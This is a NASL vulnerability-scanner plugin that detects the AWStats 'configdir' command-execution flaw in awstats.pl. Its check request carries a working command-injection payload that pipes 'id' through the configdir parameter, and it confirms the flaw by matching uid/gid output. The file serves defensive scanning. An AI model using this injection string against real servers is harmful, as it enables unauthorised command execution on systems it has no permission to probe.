#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
# Ref: iDEFENSE 
#
# This script is released under the GNU GPLv2
#
# changes by rd: changed the web reqeuest

 
 desc = "
The remote host is running AWStats, a free real-time logfile analyzer.

The remote version of this software is prone to an input validation 
vulnerability. 

The issue is reported to exist because user supplied 'configdir' URI data passed
to the 'awstats.pl' script is not sanitized.

An attacker may exploit this condition to execute commands remotely or disclose 
contents of web server readable files. 

Solution : Upgrade at least to version 6.3 of this software
Risk factor : High";


if(description)
{
 script_id(16189);
 script_bugtraq_id(12270, 12298);
 script_version("$Revision: 1.5 $");

 name["english"] = "AWStats configdir parameter arbitrary cmd exec";

 script_name(english:name["english"]);

 script_description(english:desc);
 
 summary["english"] = "Determines the presence of AWStats awstats.pl flaws";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


http_check_remote_code (
			extra_dirs:make_list("/awstats"),
			extra_check:"Check config file, permissions and AWStats documentation",
			check_request:"/awstats.pl?configdir=|echo%20Content-Type:%20text/html;%20echo%20;id|%00",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
